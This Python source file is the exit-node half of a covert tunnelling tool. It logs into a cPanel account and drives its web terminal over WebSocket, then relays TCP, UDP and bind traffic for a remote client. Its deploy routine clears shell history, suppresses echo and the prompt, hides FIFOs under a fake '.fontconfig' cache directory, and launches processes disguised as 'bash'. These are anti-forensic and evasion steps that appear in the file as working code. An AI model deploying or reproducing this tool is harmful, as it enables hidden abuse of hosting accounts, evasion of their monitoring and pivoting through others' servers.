#!/usr/bin/env python3
"""
Tunnel Exit (Client B) — exit node side.
Connects to cPanel (where relay is already running), deploys its bridge,
then handles tunnel frames: opens TCP connections to targets and relays data.
Run this AFTER tunnel_server.py is waiting for the exit node.
"""

import asyncio
import base64
import os
import socket
import ssl
import sys

import requests
import websockets
from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK

from cpanel_auth import CONFIG_FILE, load_config, cpanel_login, build_ws_url
from proxy_util import create_proxy_connection

MAX_CHUNK = 2048
DEBUG = False


def dbg(msg):
    if DEBUG:
        print("[dbg] %s" % msg)


# ---------------------------------------------------------------------------
# Protocol helpers
# ---------------------------------------------------------------------------

def encode_frame(ftype, conn_id, payload=b""):
    return "%s:%d:%s\n" % (ftype, conn_id, base64.b64encode(payload).decode("ascii"))


def decode_frame(line):
    parts = line.strip().split(":", 2)
    if len(parts) < 3:
        return None, 0, b""
    ftype = parts[0]
    try:
        conn_id = int(parts[1])
    except ValueError:
        return None, 0, b""
    payload = base64.b64decode(parts[2]) if parts[2] else b""
    return ftype, conn_id, payload


# ---------------------------------------------------------------------------
# Deployer — uploads bridge script only (relay already running)
# ---------------------------------------------------------------------------

async def deploy_bridge(ws):
    """Deploy bridge (client.py) to cPanel, exec it, wait for TUNNEL_READY."""

    async def send_cmd(cmd):
        await ws.send(cmd + "\n")

    async def drain(timeout=0.5, silent=True):
        collected = ""
        try:
            while True:
                frame = await asyncio.wait_for(ws.recv(), timeout=timeout)
                if isinstance(frame, bytes):
                    frame = frame.decode("utf-8", errors="replace")
                collected += frame
        except asyncio.TimeoutError:
            pass
        if not silent and collected.strip():
            print("[debug] %s" % collected.strip()[:200])
        return collected

    # Suppress echo, newline translation, prompt, and history
    await send_cmd("HISTFILE=/dev/null; history -c")
    await asyncio.sleep(0.2)
    await send_cmd("stty -echo")
    await asyncio.sleep(0.3)
    await send_cmd("stty -onlcr")
    await asyncio.sleep(0.2)
    await send_cmd("export PS1=''")
    await asyncio.sleep(0.2)
    await drain(0.5)

    # Wait for Client A to create the FIFOs
    await send_cmd("while [ ! -p $HOME/.cache/.fontconfig/.uuid-w ]; do sleep 0.2; done")
    await asyncio.sleep(0.5)
    await drain(0.3, silent=False)

    # Open pipes with disguised process names
    # We read from a2b (uuid-w) and write to b2a (uuid-r)
    await send_cmd("exec -a 'bash' cat $HOME/.cache/.fontconfig/.uuid-w & exec -a 'bash' cat > $HOME/.cache/.fontconfig/.uuid-r")

    # Wait for TUNNEL_READY from Client A (comes through the FIFO).
    # Client A sends probes repeatedly until we echo back.
    buf = ""
    while True:
        try:
            frame = await asyncio.wait_for(ws.recv(), timeout=60.0)
        except asyncio.TimeoutError:
            raise RuntimeError("Timed out waiting for TUNNEL_READY from Client A")
        if isinstance(frame, bytes):
            frame = frame.decode("utf-8", errors="replace")
        buf += frame
        if "TUNNEL_READY" in buf:
            # Echo back so Client A confirms the round-trip works
            await ws.send("TUNNEL_READY\n")
            print("[+] Tunnel established.")
            return


# ---------------------------------------------------------------------------
# TCP connection manager — handles N/D/C frames
# ---------------------------------------------------------------------------

class ExitNode:
    def __init__(self, ws):
        self.ws = ws
        self._send_lock = asyncio.Lock()
        self._tcp_conns = {}   # conn_id -> (reader, writer)
        self._udp_conns = {}   # conn_id -> socket
        self._read_tasks = {}  # conn_id -> task

    async def send_frame(self, ftype, conn_id, payload=b""):
        data = encode_frame(ftype, conn_id, payload)
        async with self._send_lock:
            await self.ws.send(data)

    # --- TCP CONNECT ---

    async def handle_new(self, conn_id, payload):
        """Open TCP connection to target, send ack back."""
        target = payload.decode("utf-8", errors="replace")
        dbg("N conn_id=%d target=%s" % (conn_id, target))
        host_port = target.rsplit(":", 1)
        if len(host_port) != 2:
            dbg("conn_id=%d ERR bad_target" % conn_id)
            await self.send_frame("A", conn_id, b"ERR:bad_target")
            return
        host, port_s = host_port
        try:
            port = int(port_s)
        except ValueError:
            dbg("conn_id=%d ERR bad_port" % conn_id)
            await self.send_frame("A", conn_id, b"ERR:bad_port")
            return

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=10.0
            )
        except Exception as e:
            msg = "ERR:%s" % str(e)[:100]
            dbg("conn_id=%d connect failed: %s" % (conn_id, msg))
            await self.send_frame("A", conn_id, msg.encode("utf-8"))
            return

        self._tcp_conns[conn_id] = (reader, writer)
        dbg("conn_id=%d connected OK" % conn_id)
        await self.send_frame("A", conn_id, b"OK")

        task = asyncio.ensure_future(self._tcp_reader(conn_id, reader))
        self._read_tasks[conn_id] = task

    async def _tcp_reader(self, conn_id, reader):
        try:
            while True:
                data = await reader.read(MAX_CHUNK)
                if not data:
                    await self.send_frame("C", conn_id)
                    break
                for i in range(0, len(data), MAX_CHUNK):
                    await self.send_frame("D", conn_id, data[i:i + MAX_CHUNK])
        except (ConnectionError, OSError):
            await self.send_frame("C", conn_id)
        finally:
            self._close_conn(conn_id)

    async def handle_data(self, conn_id, payload):
        pair = self._tcp_conns.get(conn_id)
        if pair is None:
            return
        _, writer = pair
        try:
            writer.write(payload)
            await writer.drain()
        except (ConnectionError, OSError):
            await self.send_frame("C", conn_id)
            self._close_conn(conn_id)

    # --- BIND ---

    async def handle_bind(self, conn_id, payload):
        """Bind a port and wait for incoming connection."""
        loop = asyncio.get_event_loop()
        try:
            srv = await asyncio.start_server(
                lambda r, w: None, "0.0.0.0", 0
            )
            bind_addr, bind_port = srv.sockets[0].getsockname()
            await self.send_frame("A", conn_id,
                                  ("OK:%s:%d" % (bind_addr, bind_port)).encode("utf-8"))
        except Exception as e:
            await self.send_frame("A", conn_id,
                                  ("ERR:%s" % str(e)[:100]).encode("utf-8"))
            return

        # Wait for one incoming connection
        incoming_fut = loop.create_future()

        async def on_connect(reader, writer):
            if not incoming_fut.done():
                incoming_fut.set_result((reader, writer))

        srv.close()
        # Re-create with the callback
        try:
            srv = await asyncio.start_server(on_connect, "0.0.0.0", bind_port)
            reader, writer = await asyncio.wait_for(incoming_fut, timeout=120.0)
        except asyncio.TimeoutError:
            await self.send_frame("C", conn_id)
            srv.close()
            return
        except Exception as e:
            await self.send_frame("A", conn_id,
                                  ("ERR:%s" % str(e)[:100]).encode("utf-8"))
            return

        peername = writer.get_extra_info("peername")
        remote_host = peername[0] if peername else "0.0.0.0"
        remote_port = peername[1] if peername else 0
        await self.send_frame("I", conn_id,
                              ("%s:%d" % (remote_host, remote_port)).encode("utf-8"))

        self._tcp_conns[conn_id] = (reader, writer)
        task = asyncio.ensure_future(self._tcp_reader(conn_id, reader))
        self._read_tasks[conn_id] = task
        srv.close()

    # --- UDP ASSOCIATE ---

    async def handle_udp(self, conn_id, payload):
        """Forward a UDP datagram to the target and listen for response."""
        loop = asyncio.get_event_loop()
        # payload = target_host:target_port\x00udp_data
        sep = payload.find(b"\x00")
        if sep < 0:
            dbg("U conn_id=%d bad payload (no separator)" % conn_id)
            return
        target_info = payload[:sep].decode("utf-8", errors="replace")
        udp_data = payload[sep + 1:]
        parts = target_info.rsplit(":", 1)
        if len(parts) != 2:
            dbg("U conn_id=%d bad target: %s" % (conn_id, target_info))
            return
        host = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            dbg("U conn_id=%d bad port: %s" % (conn_id, parts[1]))
            return
        dbg("U conn_id=%d → %s:%d (%d bytes)" % (conn_id, host, port, len(udp_data)))

        # Reuse or create UDP socket for this conn_id
        sock = self._udp_conns.get(conn_id)
        if sock is None:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            sock.bind(("0.0.0.0", 0))
            self._udp_conns[conn_id] = sock
            # Start reader task for responses
            task = asyncio.ensure_future(self._udp_reader(conn_id, sock))
            self._read_tasks[conn_id] = task

        try:
            sock.sendto(udp_data, (host, port))
        except OSError:
            pass

    async def _udp_reader(self, conn_id, sock):
        """Read UDP responses and send them back through tunnel."""
        loop = asyncio.get_event_loop()
        while True:
            try:
                data, addr = await loop.run_in_executor(
                    None, lambda: sock.recvfrom(65535)
                )
            except OSError:
                break
            if not data:
                break
            src_host, src_port = addr
            response = ("%s:%d" % (src_host, src_port)).encode("utf-8") + b"\x00" + data
            await self.send_frame("U", conn_id, response)

    # --- Common ---

    def handle_close(self, conn_id):
        self._close_conn(conn_id)

    def _close_conn(self, conn_id):
        pair = self._tcp_conns.pop(conn_id, None)
        if pair:
            _, writer = pair
            try:
                writer.close()
            except OSError:
                pass
        sock = self._udp_conns.pop(conn_id, None)
        if sock:
            try:
                sock.close()
            except OSError:
                pass
        task = self._read_tasks.pop(conn_id, None)
        if task and not task.done():
            task.cancel()

    async def cleanup(self):
        for cid in list(self._tcp_conns):
            self._close_conn(cid)
        for cid in list(self._udp_conns):
            self._close_conn(cid)


# ---------------------------------------------------------------------------
# Main loop — read frames from WebSocket, dispatch to ExitNode
# ---------------------------------------------------------------------------

async def run_exit_once(cfg, ssl_ctx, on_established=None):
    """Single exit node session. Raises on disconnect.

    If *on_established* is set, it is called (sync) once the exit node is active
    so the parent can reset reconnect backoff after a healthy bring-up.
    """
    verify_ssl = cfg["verify_ssl"]

    proxy = cfg.get("proxy")

    print("[*] Logging in to cPanel ...")
    token, cookie = cpanel_login(
        cfg["host"], cfg["port"], cfg["username"], cfg["password"], verify_ssl, proxy
    )
    print("[+] Authenticated. Token: cpsess%s..." % token[:8])

    ws_url = build_ws_url(cfg["host"], cfg["port"], token)
    origin = "https://%s:%d" % (cfg["host"], cfg["port"])

    print("[*] Connecting WebSocket ...")
    ws_kwargs = dict(
        ssl=ssl_ctx,
        additional_headers={"Origin": origin, "Cookie": cookie},
        ping_interval=20,
        ping_timeout=30,
    )
    sock = await create_proxy_connection(proxy, cfg["host"], cfg["port"])
    if sock:
        ws_kwargs["sock"] = sock
        ws_kwargs["server_hostname"] = cfg["host"]

    async with websockets.connect(ws_url, **ws_kwargs) as ws:
        print("[*] Setting up FIFOs ...")
        await deploy_bridge(ws)

        node = ExitNode(ws)

        async def keepalive():
            try:
                while True:
                    await asyncio.sleep(15)
                    await node.send_frame("P", 0)
            except (asyncio.CancelledError, ConnectionClosedError, ConnectionClosedOK):
                pass

        ka_task = asyncio.ensure_future(keepalive())

        print("[+] Exit node active. Waiting for connections ...")
        if on_established is not None:
            on_established()

        buf = ""
        try:
            async for raw in ws:
                if isinstance(raw, bytes):
                    raw = raw.decode("utf-8", errors="replace")
                buf += raw
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    if not line.strip():
                        continue
                    ftype, cid, payload = decode_frame(line)
                    if ftype is None:
                        continue

                    if ftype in ("N", "B", "U"):
                        dbg("frame: %s conn_id=%d payload=%s" % (ftype, cid, payload[:60]))
                    if ftype == "N":
                        await node.handle_new(cid, payload)
                    elif ftype == "D":
                        await node.handle_data(cid, payload)
                    elif ftype == "C":
                        dbg("C conn_id=%d close" % cid)
                        node.handle_close(cid)
                    elif ftype == "B":
                        await node.handle_bind(cid, payload)
                    elif ftype == "U":
                        await node.handle_udp(cid, payload)
                    elif ftype == "P":
                        pass
        finally:
            ka_task.cancel()
            await node.cleanup()


async def run_exit(cfg):
    verify_ssl = cfg["verify_ssl"]
    ssl_ctx = True
    if not verify_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    retry = 0

    def session_established():
        nonlocal retry
        retry = 0

    while True:
        try:
            await run_exit_once(cfg, ssl_ctx, on_established=session_established)
            break
        except KeyboardInterrupt:
            raise
        except (ConnectionClosedError, ConnectionClosedOK, websockets.exceptions.InvalidStatusCode,
                ConnectionRefusedError, OSError, RuntimeError) as e:
            retry += 1
            wait = min(retry * 2, 30)
            print("[!] Disconnected: %s" % e)
            print("[*] Reconnecting in %ds (attempt %d) ..." % (wait, retry))
            await asyncio.sleep(wait)
        except requests.exceptions.RequestException as e:
            retry += 1
            wait = min(retry * 2, 30)
            print("[!] Auth error: %s" % e)
            print("[*] Retrying in %ds (attempt %d) ..." % (wait, retry))
            await asyncio.sleep(wait)


def main():
    global DEBUG
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    config_path = args[0] if args else CONFIG_FILE
    DEBUG = "--debug" in sys.argv or "-d" in sys.argv

    try:
        cfg = load_config(config_path)
    except (FileNotFoundError, ValueError) as e:
        print("Config error: %s" % e, file=sys.stderr)
        sys.exit(1)

    for field in ("host", "username", "password"):
        if not cfg[field]:
            print("Config error: '%s' is required" % field, file=sys.stderr)
            sys.exit(1)

    if not cfg["verify_ssl"]:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        asyncio.run(run_exit(cfg))
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")


if __name__ == "__main__":
    main()
